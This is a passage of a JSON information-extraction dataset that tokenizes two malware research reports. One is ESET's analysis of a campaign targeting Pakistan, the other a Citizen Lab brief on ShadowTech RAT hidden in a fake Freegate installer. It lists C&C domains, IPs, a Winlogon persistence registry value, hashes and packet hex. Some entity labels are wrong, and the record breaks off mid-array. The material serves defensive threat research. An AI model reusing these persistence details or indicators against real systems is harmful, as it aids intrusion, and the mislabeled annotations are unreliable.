"shellcode", "sends", "information", "about", "the", "system", "to", "the", "domain", "feds.comule.com", "and", "then", "downloads", "a", "malicious", "binary", "from", "digitalapp.org", "."], ["The", "other", "infection", "vector", "we", "found", "used", "PE", "files", "disguised", "as", "Microsoft", "Word", "or", "PDF", "documents", ",", "most", "likely", "distributed", "through", "email", "."], ["When", "the", "user", "executes", "the", "file", ",", "the", "malicious", "program", "downloads", "and", "executes", "additional", "malicious", "binaries", "(", "more", "on", "these", "executables", "below", ")", "."], ["To", "evade", "suspicion", "by", "the", "victim", ",", "a", "decoy", "Word", "document", "is", "shown", "to", "the", "user", "."], ["We", "have", "identified", "several", "different", "documents", "that", "followed", "different", "themes", "."], ["One", "of", "these", "themes", "is", "the", "Indian", "armed", "forces", "."], ["We", "do", "not", "have", "inside", "information", "as", "to", "which", "individuals", "or", "organizations", "were", "really", "targeted", "by", "these", "files", "."], ["However", ",", "based", "on", "our", "detection", "metrics", ",", "it", "is", "our", "assumption", "that", "people", "and", "institutions", "in", "Pakistan", "were", "targeted", "."], ["The", "text", "in", "this", "first", "document", "seems", "to", "be", "a", "collage", "of", "various", "sources", "."], ["The", "fake", "PDF", "document", "was", "delivered", "through", "a", "self", "-", "extracting", "archive", "called", "\u201c", "pakistandefencetoindiantopmiltrysecreat.exe", "\u201d", ":", "3/11"], ["This", "other", "PDF", "document", "was", "delivered", "through", "an", "executable", "called", "\u201c", "pakterrisiomforindian.exe", "\u201d", ":", "4/11"], ["In", "this", "case", ",", "the", "text", "comes", "from", "the", "Asian", "Defence", "blog", ",", "a", "blog", "aggregating", "Asian", "military", "news", "."], ["Our", "telemetry", "data", "shows", "that", "this", "file", "was", "first", "seen", "in", "August", "2011", "on", "a", "system", "in", "Pakistan", "."], ["Payloads"], ["We", "found", "many", "different", "types", "of", "payloads", "installed", "by", "the", "droppers", ",", "all", "of", "them", "were", "geared", "towards", "exfiltrating", "data", "from", "an", "infected", "computer", "to", "the", "attackers", "\u2019", "servers", "."], ["The", "following", "table", "groups", "the", "binaries", "in", "different", "families", "and", "details", "their", "general", "characteristics", "."], ["Category", "Description", "Downloader", "Downloads", "executables", "from", "C&C"], ["and"], ["executes", "them", "."], ["Document", "uploader", "Searches", "and", "uploads", "documents", "(", "csv", ",", "pdf", ",", "doc", ",", "docx", ",", "xlsx", ",", "etc", ")", "found", "in", "the", "trash", "and", "in", "the", "\u201c", "My", "Documents", "\u201d", "folder", "."], ["System", "information", "gathering", "Sends", "information", "about", "the", "infected", "system", "to", "the", "C&C", "using", "GET", "requests", "."], ["It", "uses", "WMI", "to", "gather", "information", "on", "the", "infected", "system", "such", "as", ":", "Antivirus", "installed", "on", "machine", ";", "OS", "version", ";", "Presence", "of", "files", "to", "upload", "Keylogger"], ["Records", "keystrokes", "and", "sends", "log", "to", "attacker", "server", "using", "POST", "requests", "."], ["Screenshot", "Takes", "a", "screenshot", "of", "the", "desktop", "and", "sends", "it", "to", "the", "C&C."], ["Connect", "-", "back", "shell"], ["Continually", "tries", "to", "connect", "back", "to", "an", "hardcoded", "IP", "address", "and", "allows", "the", "attacker", "to", "open", "a", "remote", "command", "shell", "."], ["Public", "Tools"], ["We", "found", "two", "public", "tools", "(", "WebPassView", "and", "Mail", "PassView", ")", "from", "NirSoft", "and", "signed", "by", "the", "malicious", "certificate", "."], ["These", "legitimate", "tools", "can", "be", "used", "to", "recover", "passwords", "used", "in", "email", "clients", "or", "stored", "in", "browsers", "."], ["5/11", "Selfreplication", "through", "removable", "drives", "Monitors", "removable", "drive", "insertion", "events", "and", "copies", "different", "malware", "files", "to", "the", "inserted", "drive", "."], ["It", "tries", "to", "lure", "the", "user", "into", "executing", "one", "of", "the", "copied", "files", "by", "renaming", "it", "with", "an", "existing", "folder", "name", "and", "hiding", "the", "latter", "."], ["The", "information", "stolen", "from", "an", "infected", "computer", "is", "uploaded", "to", "the", "attacker", "\u2019s", "server", "unencrypted", "."], ["The", "decision", "not", "to", "use", "encryption", "is", "puzzling", "considering", "that", "adding", "basic", "encryption", "would", "be", "easy", "and", "provide", "additional", "stealth", "to", "the", "operation", "."], ["The", "screenshot", "below", "shows", "a", "typical", "keylogger", "log", ":", "The", "logs", "are", "very", "verbose", "and", "display", "the", "active", "window", ",", "the", "characters", "typed", "and", "the", "special", "keys", "in", "brackets", "."], ["Since", "these", "logs", "are", "sent", "unencrypted", ",", "it", "is", "easy", "to", "detect", "the", "presence", "of", "an", "infected", "machine", "on", "your", "network", "by", "examining", "your", "HTTP", "network", "traffic", "."], ["In", "terms", "of", "persistence", ",", "many", "binaries", "we", "have", "analyzed", "add", "an", "entry", "in", "the", "Windows", "startup", "menu", "with", "a", "deceptive", "name", "."], ["The", "screen", "shot", "below", "shows", "an", "example", "of", "such", "a", "startup", "menu", ":", "6/11", "While", "this", "technique", "allows", "the", "different", "components", "of", "the", "attack", "to", "be", "launched", "after", "each", "system", "reboot", ",", "it", "can", "not", "be", "labelled", "as", "stealthy", "."], ["Since", "targeted", "attacks", "usually", "try", "to", "stay", "under", "the", "radar", "as", "long", "as", "possible", ",", "we", "were", "surprised", "to", "see", "this", "technique", "used", "in", "this", "case", "."], ["C&C", "infrastructure"], ["Most", "of", "the", "analyzed", "binaries", "contain", "a", "URL", "from", "which", "additional", "components", "are", "downloaded", "or", "to", "which", "an", "infected", "system", "\u2019s", "content", "is", "uploaded", "."], ["Sometimes", ",", "the", "C&C", "URL", "appears", "unencrypted", "in", "the", "binary", "."], ["Other", "times", ",", "it", "is", "trivially", "encoded", "using", "a", "simple", "one", "-", "character", "rotation", "(", "ROT-1", ")", "as", "depicted", "below", ":", "1", "\u201c", "gjmftbttpdjbuf", "/", "ofu", "\u201d", "encrypted", "to", "\u201c", "filesassociate.net", "\u201d", "We", "uncovered", "more", "than", "20", "domains", "linked", "to", "this", "campaign", "."], ["While", "some", "still", "had", "an", "active", "DNS", "record", ",", "most", "of", "them", "did", "not", "resolve", "to", "an", "IP", "address", "."], ["Using", "historical", "data", "around", "these", "domains", ",", "we", "were", "able", "to", "discover", "where", "these", "sites", "were", "hosted", "."], ["It", "turns", "out", "that", "almost", "a", "third", "of", "all", "domains", "were", "hosted", "by", "OVH", "."], ["This", "web", "hosting", "service", "has", "a", "reputation", "for", "hosting", "malware", "and", "spam", "content", "."], ["In", "a", "recent", "HOSTExploit", "report", "it", "was", "ranked", "number", "5", "in", "the", "top", "50", "hosts", "for", "concentration", "of", "malicious", "activity", "served", "from", "an", "Autonomous", "System", "."], ["Most", "of", "the", "domain", "names", "are", "very", "close", "to", "real", "site", "or", "company", "names", "."], ["This", "is", "a", "common", "tactic", "to", "try", "to", "conceal", "the", "true", "purpose", "of", "the", "C&C", "server", "."], ["Two", "examples", "are", "\u201c", "wearwellgarments.eu", "\u201d", "and", "\u201c", "secuina.com", "\u201d", "."], ["The", "former", "is", "very", "close", "to", "a", "real", "website", "called", "\u201c", "wearwellgarments.com", "\u201d", "while", "the", "latter", "looks", "like", "a", "misspelling", "of", "information", "security", "firm", "Secunia", "."], ["7/11", "Origins", "of", "the", "malicious", "files"], ["Analyzing", "this", "campaign", "allowed", "us", "to", "identify", "a", "few", "key", "indicators", "pointing", "to", "the", "geographic", "origin", "of", "these", "malicious", "files", "."], ["We", "believe", "they", "all", "come", "from", "India", "."], ["First", ",", "the", "code", "signing", "certificate", "was", "issued", "to", "an", "Indian", "company", "."], ["In", "addition", ",", "all", "the", "signing", "timestamps", "are", "between", "5:06", "and", "13:45", "UTC", ",", "which", "is", "consistent", "with", "8", "-", "hour", "work", "shifts", "falling", "between", "10:36", "and", "19:15", "in", "Indian", "Standard", "Time", "."], ["This", "might", "seem", "a", "bit", "late", ",", "but", "considering", "that", "signing", "the", "binary", "is", "the", "last", "step", "in", "the", "development", "effort", ",", "it", "is", "likely", "that", "the", "malware", "authors", "were", "living", "in", "this", "time", "zone", "."], ["We", "also", "found", "several", "strings", "in", "the", "binaries", "that", "are", "related", "to", "Indian", "culture", "."], ["In", "several", "scripts", ",", "a", "variable", "called", "ramukaka", "is", "used", ":", "Ramu", "Kaka", "is", "a", "typical", "Bollywood", "-", "style", "servant", "in", "a", "house", "."], ["Considering", "that", "this", "variable", "is", "responsible", "for", "achieving", "persistence", "on", "the", "system", ",", "this", "definition", "is", "a", "good", "fit", "."], ["The", "most", "compelling", "argument", "is", "found", "in", "our", "telemetry", "data", "."], ["We", "found", "that", "many", "malware", "variants", "tied", "to", "this", "campaign", "appeared", "in", "the", "same", "location", "over", "a", "very", "small", "period", "of", "time", "."], ["Each", "variant", "had", "only", "minor", "differences", "from", "each", "other", ",", "strongly", "suggesting", "an", "attempt", "by", "a", "malware", "creator", "to", "evade", "detection", "by", "our", "product", "."], ["These", "files", "all", "appeared", "in", "the", "same", "region", "of", "India", "."], ["Infection", "statistics"], ["Our", "telemetry", "data", "shows", "that", "Pakistan", "is", "heavily", "affected", "by", "this", "campaign", "."], ["The", "following", "graph", "shows", "the", "detection", "distribution", "we", "have", "observed", "for", "all", "the", "malicious", "files", "we", "linked", "to", "this", "campaign", "in", "the", "last", "two", "years", "."], ["8/11", "Thanks", "to", "our", "sinkholing", "of", "three", "domain", "names", "used", "by", "this", "campaign", ",", "we", "were", "also", "able", "to", "gather", "statistics", "on", "the", "geographical", "location", "of", "infected", "hosts", "."], ["As", "one", "can", "see", ",", "the", "regional", "distribution", "presented", "in", "the", "last", "two", "graphs", "is", "very", "different", "."], ["Ukraine", "and", "Kazakhstan", "account", "for", "three", "quarters", "of", "all", "IP", "addresses", "seen", "during", "the", "sinkholing", "operation", "."], ["This", "difference", "can", "be", "explained", "by", "the", "possibility", "that", "unique", "domains", "are", "only", "for", "specific", "sub", "-", "operation", "in", "this", "campaign", "."], ["If", "that", "was", "the", "case", ",", "the", "sinkhole", "data", "we", "are", "seeing", "would", "only", "be", "a", "very", "partial", "view", "of", "the", "whole", "campaign", "."], ["Conclusion"], ["This", "post", "examined", "evidence", "of", "a", "far", "-", "reaching", "targeted", "campaign", "aimed", "at", "different", "targets", "throughout", "the", "world", "."], ["Our", "analysis", "indicates", "that", "the", "entire", "campaign", "originates", "9/11", "from", "India", "."], ["Although", "we", "have", "seen", "a", "number", "of", "infections", "throughout", "the", "world", ",", "it", "seems", "that", "the", "most", "prominent", "target", "is", "Pakistan", "."], ["Targeted", "attacks", "are", "all", "too", "common", "these", "days", ",", "but", "this", "one", "is", "certainly", "noteworthy", "for", "its", "failure", "to", "employ", "advanced", "tools", "to", "conduct", "its", "campaigns", "."], ["String", "obfuscation", "using", "simple", "rotation", "(", "a", "shift", "cipher", ")", ",", "no", "cryptography", "used", "in", "network", "communication", ",", "persistence", "achieved", "through", "the", "startup", "menu", "and", "use", "of", "existing", ",", "publicly", "-", "available", "tools", "to", "gather", "information", "on", "infected", "systems", "shows", "that", "the", "attackers", "did", "not", "go", "to", "great", "lengths", "to", "cover", "their", "tracks", "."], ["On", "the", "other", "hand", ",", "maybe", "they", "see", "no", "need", "to", "implement", "stealthier", "techniques", "because", "the", "simple", "ways", "still", "work", "."], ["SHA1", "Hashes", "1", "CVE-2012", "-", "0158", "RTF", "Document", ":", "3b1d9d65159bea24ab1060e5603f9e3c2d38d08d", "2", "pakterrisiomforindian.exe", ":", "3", "pakistandefencetoindiantopmiltrysecreat.exe", ":", "1db89237ef786c7f22a8d4cd7eccda8f6286a6de", "4", "Downloader", ":", "5", "Document", "uploader", ":", "6", "System", "information", "gathering", ":", "7", "Keylogger", ":", "8", "Screenshot", ":", "9", "Connect", "-", "back", "shell", ":", "10", "Self", "-", "replication", "through", "removable", "drives", ":", "20A29D1F89C07BAFBB4C61CE208531D68125C8E", "d859f1cf99049f89258c1faa59dcd97f587e45ac", "08ce405f0a0277de355454862b164ffd94a7ea36"], ["DB22E7DEA0C1CAF203072693485DE4E4FD2CB56A"], ["0D610F3F51750EADCF426E10E6DE5313605400FA", "AE7B9CFB10CD65B98C59DC012D6726B66BE92897", "A0DD0B8FD0C98E917BFDC96182088CAB5505CCD2", "09D4ECA67B1D071E57C5951D97FE9DD9C62F1580", "Detection", "Names"], ["Below", "are", "ESET", "threat", "names", "related", "to", "this", "case", ":", "10/11", "1", "Win32", "/", "Agent", ".", "NLD", "worm", "2"], ["Win32", "/", "Spy", ".", "Agent", ".", "NZD", "trojan", "3", "Win32", "/", "Spy", ".", "Agent", ".", "OBF", "trojan", "4", "Win32", "/", "Spy", ".", "Agent", ".", "OBV", "trojan", "5", "Win32", "/", "Spy", ".", "KeyLogger", ".", "NZL", "trojan", "6", "Win32", "/", "Spy", ".", "KeyLogger", ".", "NZN", "trojan", "7", "Win32", "/", "Spy", ".", "VB.NOF", "trojan", "8", "Win32", "/", "Spy", ".", "VB.NRP", "trojan", "9", "Win32", "/", "TrojanDownloader", ".", "Agent", ".", "RNT", "trojan", "10", "Win32", "/", "TrojanDownloader", ".", "Agent", ".", "RNV", "trojan", "11", "Win32", "/", "TrojanDownloader", ".", "Agent", ".", "RNW", "trojan", "12", "Win32", "/", "VB.NTC", "trojan", "13", "Win32", "/", "VB.NVM", "trojan", "14", "Win32", "/", "VB.NWB", "trojan", "15", "Win32", "/", "VB.QPK", "trojan", "16"], ["Win32", "/", "VB.QTV", "trojan", "17", "Win32", "/", "VB.QTY", "trojan", "18", "Win32", "/", "Spy", ".", "Agent", ".", "NVL", "trojan", "19", "Win32", "/", "Spy", ".", "Agent", ".", "OAZ", "trojan", "Jean", "-", "Ian", "Boutin", "16", "May", "2013", "-", "10:15AM", "11/11"]]}, {"vertexSet": [[{"name": "The Citizen Lab", "pos": [7, 10], "sent_id": 0, "type": "Organization"}], [{"name": "Pro-Government Electronic Actors", "pos": [8, 13], "sent_id": 5, "type": "Attacker"}], [{"name": "Syrian Electronic Army", "pos": [8, 11], "sent_id": 6, "type": "Attacker"}], [{"name": "Syrian activists", "pos": [2, 4], "sent_id": 7, "type": "ExploitTargetObject"}], [{"name": "2012", "pos": [1, 2], "sent_id": 8, "type": "Time"}], [{"name": "Morgan Marquis-Boire", "pos": [18, 22], "sent_id": 8, "type": "Payload"}], [{"name": "Eva Galperin", "pos": [23, 25], "sent_id": 8, "type": "Payload"}], [{"name": "Electronic Frontier Foundation", "pos": [30, 33], "sent_id": 8, "type": "Organization"}], [{"name": "Telecomix", "pos": [45, 46], "sent_id": 8, "type": "Organization"}], [{"name": "Cyber Arabs", "pos": [16, 18], "sent_id": 9, "type": "Organization"}], [{"name": "second week of June", "pos": [10, 14], "sent_id": 18, "type": "Time"}], [{"name": "malicious installer of Freegate", "pos": [27, 31], "sent_id": 18, "type": "Malware"}], [{"name": "attackers", "pos": [22, 23], "sent_id": 22, "type": "Attacker"}], [{"name": "June 15, 2013", "pos": [23, 27], "sent_id": 23, "type": "Time"}], [{"name": "VPN-PRO.zip", "pos": [0, 3], "sent_id": 24, "type": "File"}], [{"name": "VPN-Pro.exe", "pos": [0, 3], "sent_id": 27, "type": "File"}], [{"name": "ShadowTech Rat", "pos": [0, 2], "sent_id": 112, "type": "TrojanHorse"}], [{"name": "keylogging", "pos": [12, 13], "sent_id": 114, "type": "Exploit"}], [{"name": "remote activation of the webcam", "pos": [14, 19], "sent_id": 114, "type": "Exploit"}], [{"name": "VPN-Pro.exe", "pos": [47, 48], "sent_id": 115, "type": "Malware"}], [{"name": "svhost.exe", "pos": [49, 50], "sent_id": 115, "type": "Malware"}], [{"name": "June 20, 2013", "pos": [2, 6], "sent_id": 116, "type": "Time"}], [{"name": "svchost.exe", "pos": [7, 8], "sent_id": 116, "type": "Malware"}], [{"name": "VPN-Pro.exe", "pos": [23, 24], "sent_id": 116, "type": "Malware"}], [{"name": "thejoe.publicvm.com", "pos": [17, 18], "sent_id": 117, "type": "Indicator"}], [{"name": "31.9.48.119", "pos": [11, 12], "sent_id": 118, "type": "Address"}], [{"name": "31.9.0.0", "pos": [4, 5], "sent_id": 119, "type": "Address"}], [{"name": "31.9.127.255", "pos": [6, 7], "sent_id": 119, "type": "Address"}], [{"name": "malicious installers for Green Simurgh", "pos": [3, 8], "sent_id": 122, "type": "Malware"}], [{"name": "Gh0st RAT", "pos": [7, 9], "sent_id": 125, "type": "Malware"}], [{"name": "campaign", "pos": [2, 3], "sent_id": 128, "type": "Campaign"}], [{"name": "January 2013", "pos": [22, 24], "sent_id": 129, "type": "Time"}], [{"name": "Syrian opposition", "pos": [18, 20], "sent_id": 130, "type": "ExploitTargetObject"}], [{"name": "e-mail", "pos": [12, 15], "sent_id": 134, "type": "Email"}], [{"name": "06/16/2013 16:49:04 [UTC]", "pos": [14, 19], "sent_id": 145, "type": "Time"}], [{"name": "06/19/2013 22:00:22", "pos": [22, 24], "sent_id": 145, "type": "Time"}], [{"name": "06/19/2013 22:00:22", "pos": [6, 8], "sent_id": 146, "type": "Time"}], [{"name": "07/17/2012 22:58:51.981 [UTC]", "pos": [3, 8], "sent_id": 149, "type": "Time"}], [{"name": "07/17/2012 22:58:51.981 [UTC]", "pos": [3, 8], "sent_id": 150, "type": "Time"}], [{"name": "07/17/2012 22:58:51.981 [UTC]", "pos": [3, 8], "sent_id": 151, "type": "Time"}], [{"name": "12/27/2012 10:55:02.540 [UTC]", "pos": [4, 9], "sent_id": 152, "type": "Time"}], [{"name": "http://[REDACTED]om/g.php?url=http://www.youtube.com/watch?v=jDkluDCn7fA", "pos": [6, 15], "sent_id": 170, "type": "Indicator"}], [{"name": "http://google-panel.html5.me/g.php?url=http://www.youtube.com/watch?v=Uw3Ny2A1WvQ", "pos": [21, 22], "sent_id": 170, "type": "Indicator"}], [{"name": "http://forgoogle.allalla.com/u.php?url=http://www.alkalimaonline.com/news.php?id=118868", "pos": [0, 1], "sent_id": 172, "type": "Indicator"}], [{"name": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"Shell\" /d \"C:\\WINDOWS\\explorer.exe, C:\\Documents and Settings\\user\\Local Settings\\Temp\\atiapfxx.exe", "pos": [3, 18], "sent_id": 185, "type": "Indicator"}], [{"name": "tn5.linkpc.net", "pos": [20, 21], "sent_id": 188, "type": "Indicator"}], [{"name": "tn5.linkpc.net", "pos": [2, 3], "sent_id": 190, "type": "Indicator"}], [{"name": "94.252.198.112", "pos": [5, 6], "sent_id": 190, "type": "Address"}], [{"name": "94.252.192.0", "pos": [10, 11], "sent_id": 190, "type": "Address"}], [{"name": "94.252.255.255", "pos": [12, 13], "sent_id": 190, "type": "Address"}], [{"name": "October 2012", "pos": [8, 10], "sent_id": 191, "type": "Time"}], [{"name": "123.functions", "pos": [10, 11], "sent_id": 192, "type": "File"}], [{"name": "tn5.linkpc.net", "pos": [2, 3], "sent_id": 200, "type": "Indicator"}]], "labels": [{"r": "P33", "h": 2, "t": 4, "evidence": [6, 8]}, {"r": "P28", "h": 23, "t": 25, "evidence": [116, 118]}, {"r": "P21", "h": 24, "t": 23, "evidence": [116, 117]}, {"r": "P33", "h": 30, "t": 31, "evidence": [128, 129]}, {"r": "P27", "h": 30, "t": 32, "evidence": [128, 130]}, {"r": "P33", "h": 12, "t": 10, "evidence": [18, 22]}, {"r": "P33", "h": 11, "t": 10, "evidence": [18]}, {"r": "P2", "h": 12, "t": 11, "evidence": [18, 22]}, {"r": "P21", "h": 14, "t": 11, "evidence": [18, 24]}, {"r": "P21", "h": 15, "t": 11, "evidence": [18, 27]}, {"r": "P33", "h": 30, "t": 35, "evidence": [128, 145]}, {"r": "P33", "h": 30, "t": 36, "evidence": [128, 146]}, {"r": "P33", "h": 30, "t": 34, "evidence": [128, 145]}, {"r": "P33", "h": 30, "t": 37, "evidence": [128, 149]}, {"r": "P33", "h": 30, "t": 38, "evidence": [128, 150]}, {"r": "P33", "h": 30, "t": 39, "evidence": [128, 151]}, {"r": "P33", "h": 30, "t": 40, "evidence": [128, 152]}, {"r": "P33", "h": 30, "t": 50, "evidence": [128, 191]}], "title": "201306CitizenLabFreeGate", "sents": [["Research", "Brief", "Number", "19", "\u2013", "June", "2013", "The", "Citizen", "Lab"], ["A", "Call", "to", "Harm", ":", "New", "Malware", "Attacks", "Target", "the", "Syrian", "Opposition", "Authors", ":", "John", "Scott", "-", "Railton", "and", "Morgan", "Marquis", "-", "Boire", "SUMMARY", "OF", "KEY", "FINDINGS", "\uf0b7", "Malware", "masquerading", "as", "the", "circumvention", "tool", "Freegate", "."], ["\uf0b7"], ["A", "campaign", "masquerading", "as", "a", "call", "to", "arms", "by", "a", "pro", "-", "opposition", "cleric", "."], ["INTRODUCTION"], ["Syria", "\u2019s", "opposition", "has", "faced", "persistent", "targeting", "by", "Pro", "-", "Government", "Electronic", "Actors", "(", "PGEAs", ")", "throughout", "the", "Syrian", "civil", "war", "."], ["A", "pro", "-", "government", "group", "calling", "itself", "the", "Syrian", "Electronic", "Army", "has", "gained", "visibility", "in", "recent", "months", "with", "high", "profile", "attacks", "against", "news", "organizations", "."], ["Meanwhile", ",", "Syrian", "activists", "continue", "to", "be", "targeted", "with", "online", "attacks", "apparently", "for", "the", "purposes", "of", "accessing", "their", "private", "communications", "and", "stealing", "their", "secrets", "."], ["Throughout", "2012", ",", "attacks", "against", "the", "Syrian", "opposition", "were", "documented", "in", "an", "extensive", "series", "of", "blog", "posts", "by", "Morgan", "Marquis", "-", "Boire", "and", "Eva", "Galperin", "with", "the", "help", "of", "the", "Electronic", "Frontier", "Foundation.1", "Many", "others", "have", "also", "contributed", "to", "research", "on", "Syrian", "malware", ",", "from", "Telecomix", "to", "a", "range", "of", "security", "companies", "."], ["Meanwhile", ",", "the", "Syrian", "opposition", ",", "and", "several", "groups", "working", "closely", "with", "it", ",", "such", "as", "Cyber", "Arabs", ",", "have", "been", "active", "in", "attempting", "to", "identify", "potential", "threats", "and", "warn", "users", "."], ["Researchers", "have", "identified", "a", "common", "theme", "among", "the", "attacks", "against", "the", "Syrian", "opposition", ":", "sophisticated", "social", "engineering", "that", "is", "grounded", "in", "an", "awareness", "of", "the", "needs", ",", "interests", ",", "and", "weaknesses", "of", "the", "opposition", "."], ["Attacks", "often", "play", "on", "curiosity", "or", "ideology", "to", "encourage", "users", "to", "enter", "passwords", "or", "click", "on", "enticing", "files", ",", "or", "exploit", "fears", "of", "hacking", "and", "surveillance", "with", "fake", "security", "tools", "."], ["Attacks", "are", "often", "transmitted", "to", "potential", "victims", "from", "the", "accounts", "of", "people", "with", "whom", "they", "are", "familiar", "."], ["1", "Number", "18", "\u2013", "June", "2013"], ["The", "two", "attacks", "that", "are", "described", "in", "this", "blogpost", "follow", "this", "theme", "."], ["One", "is", "a", "malicious", "installer", "of", "the", "circumvention", "tool", "Freegate", "."], ["The", "other", "is", "an", "e", "-", "mail", "attachment", "calling", "for", "jihad", "against", "Hezbollah", "and", "the", "Assad", "regime", "or", "promising", "interesting", "regional", "news", "."], ["ATTACK", "1", ":", "A", "HELPING", "OF", "MALWARE", "WITH", "THAT", "PROXY", "?"], ["In", "this", "attack", ",", "which", "we", "first", "observed", "in", "the", "second", "week", "of", "June", ",", "the", "potential", "victim", "is", "encouraged", "to", "visit", "a", "download", "link", "containing", "a", "malicious", "installer", "of", "Freegate", "."], ["Freegate", "is", "a", "standalone", "circumvention", "-", "bypassing", "Virtual", "Private", "Network", "(", "VPN", ")", "client", "for", "Windows", "."], ["Legitimate", "versions", "of", "the", "Freegate", "software", "are", "available", "for", "download", "on", "its", "website", "."], ["While", "initially", "developed", "for", "mainland", "Chinese", "users", ",", "the", "software", "is", "used", "in", "a", "number", "of", "other", "countries", "."], ["While", "Freegate", "was", "erroneously", "labelled", "a", "Trojan", "by", "one", "anti", "-", "virus", "company", "nearly", "a", "decade", "ago", ",", "in", "this", "attack", ",", "attackers", "packaged", "what", "appears", "to", "be", "a", "legitimate", "version", "of", "Freegate", "with", "a", "malicious", "implant.2", "The", "targeted", "group", "were", "members", "of", "the", "Syrian", "opposition", "in", "a", "private", "social", "media", "group", "."], ["http://www.mediafire.com/download/[REDACTED]/VPN-Pro.zip", "When", "a", "potential", "victim", "visits", "the", "link", ",", "they", "are", "offered", "the", "download", "of", "a", "file", "which", "MediaFire", "lists", "as", "uploaded", "on", "June", "15", ",", "2013", "."], ["VPN", "-", "PRO.zip3"], ["Uploaded", ":", "2013", "-", "06", "-", "15", "16:54:31"], ["The", "zip", "file", "extracts", "to", "a", "MS", "Windows", "executable", "file", "."], ["VPN", "-", "Pro.exe4", "2", "Number", "18", "\u2013", "June", "2013"], ["The", "binary", "was", "compiled", "at", "2013", "-", "06", "-", "15", "22:41:31", "UTC", "and", "has", "the", "following", "properties", ":"], ["LegalCopyright", ":"], ["Copyright", "\u00a9", "2013"], ["Assembly", "Version", ":", "1.0.0.0"], ["InternalName", ":", "VPN-Pro.exe", "FileVersion", ":", "1.0.0.0"], ["ProductName", ":", "VPN", "-", "Pro", "ProductVersion", ":", "1.0.0.0"], ["FileDescription", ":", "VPN", "-", "Pro", "OriginalFilename", ":", "VPN-Pro.exe", "Similar", "to", "previously", "observed", "malware", "attacks", "targeting", "the", "Syrian", "opposition", ",", "this", "was", "written", "in", ".NET", "and", "appears", "to", "require", "the", ".NET", "3.5", "framework", "to", "execute.5"], ["When", "VPN-Pro.exe", "is", "run", ",", "the", "victim", "is", "shown", "the", "Freegate", "end", "-", "user", "license", "agreement", "(", "EULA", ")", "dialogue"], ["box.6"], ["Upon", "agreeing", "to", "the", "EULA", ",", "an", "operational", "copy", "of", "Freegate", "proxy", "is", "launched", ",", "which", "includes", "a", "request", "to", "unblock", "the", "firewall", "."], ["The", "copy", "of", "Freegate", "launched", "is", "listed", "as", "\u201c", "Freegate", "7.35", "Professional", "Edition", ".", "\u201d"], ["The", "Freegate", "software", "begins", "operating", ",", "and", "quickly", "prompts", "the", "user", "for", "an", "update", ".", "3", "Number", "18"], ["\u2013", "June", "2013", "Infection"], ["In", "addition", "to", "running", "a", "legitimate", "copy", "of", "Freegate", "7.35,7", "the", "malware", "installs", "an", "implant", "."], ["4", "Number", "18", "\u2013", "June", "2013"], ["A", "fake", "\u201c", "svchost.exe", "\u201d", "is", "installed", "in", "the", "victim", "\u2019s", "Application", "Data", "directory", "."], ["C:\\Documents", "and", "Settings\\<Username>\\Application", "Data\\svchost.exe", "Dropped", "files", "on", "execution", "of", "VPN-Pro.exe", ":", "5", "Number", "18", "\u2013", "June", "2013", "Examination", "of", "the", "\u201c", "svchost.exe", "\u201d", "binary", "shows", "multiple", "references", "to", "\u201c", "ShadowTech", "Rat", ".", "\u201d"], ["0000d5f0", "00"], ["53", "68", "61", "64", "6f", "77", "54", "65", "63", "68", "20", "52", "61", "74", "2e", "|.ShadowTech", "Rat.|", "0000d600", "65", "78", "65", "00", "53", "68", "61", "64", "6f", "77", "54", "65", "63", "68", "20", "52", "|exe", "."], ["ShadowTech", "R|", "0000d610", "61", "74", "00"], ["3c", "4d", "6f", "64", "75", "6c", "65", "3e", "00", "01", "00", "03", "00"], ["|at.<Module>", ".....", "|", "<", "snip", ">", "0000d6d0", "0000d6e0"], ["0000d6f0", "0000d700"], ["0000d710", "0000d720", "0000d730", "04", "74", "74", "53", "65", "65", "63", "00", "61", "00"], ["79", "72", "74", "68", "56", "00", "49", "73", "69", "74", "5f", "61", "53", "53", "74", "61", "69", "52", "6c", "68", "65", "65", "6c", "6e", "61", "75", "61", "72"], ["6d", "69", "67", "74", "65", "64", "69", "2e", "7a", "73", "2e", "54"], ["6f", "61", "52", "61", "00"], ["4d", "79", "77", "6c"], ["75", "74", "53", "79", "70", "54", "69", "6e", "69", "68", "00", "65", "65", "7a", "74", "6f", "61", "41", "00", "63", "61", "69", "6e", "64", "70", "05", "68", "62"], ["6d", "00"], ["6f", "70", "00"], ["5f", "6c", "65", "4d", "77", "6c", "44", "52", "65", "2e", "79", "54", "69", "61", "61", "00"], ["53", "53", "65", "63", "|", ".."], ["ValueType", "..."], ["|Da|"], ["|ta", "."], ["ShadowTech_Ra|"], ["|t", "."], ["ISerializable.|", "|System", "."], ["Runtime", "."], ["S|", "|erialization", "."], ["MyS|", "|ettings", "."], ["ShadowTe|"], ["|ch_Rat", "."], ["My", "."], ["Applic|", "Examination", "of", "network", "traffic", "also", "identifies", "the", "implant", "as", "ShadowTech", "RAT", "."], ["Packet", "capture", "on", "port", "1321", "/", "tcp", ":", "00", "00"], ["68", "2e", "6e", "65", "00", "2e"], ["6d", "00", "46", "34", "44", "46", "33", "34", "01", "0c", "20", "30", "65", "79", "13", "44", "61", "06", "32", "33", "33", "32", "30", "37", "00"], ["02", "52", "2e"], ["75", "54"], ["53", "61", "67", "03", "30", "38", "39", "35", "44", "45", "00", "00"], ["61", "30", "74", "6f", "68", "74", "65", "00"], ["30", "30", "30", "33", "37", "31", "00", "00"], ["74", "2e", "72", "6b", "61", "61", "05", "00"], ["33", "42", "30", "38", "37", "35", "ff", "00"], ["2c", "30", "61", "65", "64", "03", "62", "00"], ["32", "34", "32", "30", "32", "35", "ff", "45", "20", "2c", "6c"], ["6e", "6f", "00"], ["79", "64", "34", "33", "45", "37", "36", "38", "ff", "53", "56", "20"], ["2c", "3d", "77", "00"], ["74", "31", "30", "35", "32", "30", "33", "37", "ff", "68", "65", "43", "20", "6e", "54", "00"], ["65", "30", "33", "37", "31", "38", "35", "38", "01", "61", "72", "75", "50", "75", "65", "04"], ["73"], ["32", "30", "31", "30", "30", "33", "35", "00"], ["64", "73", "6c", "75", "6c", "63", "64", "01", "36", "30", "30", "36", "35", "31", "43", "00", "6f", "69", "74", "62", "6c", "68", "61", "02", "32", "33", "31", "30", "37", "36", "0a", "00", "77", "6f", "75", "6c", "05", "5f", "74", "02", "32", "36", "36", "38", "41", "39", "0a", "00", "54"], ["6e", "72", "69", "01", "52", "61", "02", "30", "32", "33", "30", "37", "33", "0b", "00", "65", 